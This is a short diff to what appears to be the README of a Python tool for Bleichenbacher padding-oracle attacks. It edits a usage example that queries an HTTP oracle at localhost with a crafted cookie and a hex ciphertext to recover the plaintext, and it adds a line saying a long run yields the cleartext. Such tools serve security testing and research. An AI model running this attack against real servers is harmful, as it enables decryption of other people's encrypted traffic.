@@ -103,9 +103,11 @@ if __name__ == "__main__":
       return ret
     o = HttpOracle("http://127.0.0.1", headers={"Cookie":"name=%0128x"})
     o.set_proxy()
-    b = Bleichenbacher.pubkey_from_file("public_raw.pot", o, callback)
+    b = Bleichenbacher.pubkey_from_file("512.pub", o, callback)
     m, i = b.run_search("49affbbe68d923e9cd1d2420fec72aea432b5a119df51f1bba89aa1245eeb627d6809eeebb02db75746df85435735e6e6d11067d77c66da23b7722051141bb19")
     print("Found cleartext :%i in %i iterations" % (m, i))
   except KeyboardInterrupt:
     b.stop_search()
 ```
+
+Once this has run for a long time, you should get the cleartext message you are looking for
